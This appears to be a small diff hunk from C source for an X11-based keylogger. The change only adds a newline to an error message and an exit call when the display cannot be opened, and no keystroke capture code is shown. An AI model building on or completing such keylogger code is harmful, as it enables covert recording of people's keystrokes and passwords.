@@ -106,7 +106,8 @@ void keylogger(void **hdlarr) {
     display = XOpenDisplay(NULL);
 
     if (display == NULL) {
-        printf("Error: XOpenDisplay");
+        printf("Error: XOpenDisplay\n");
+        exit(1);
     }
 
     int logging = 0;
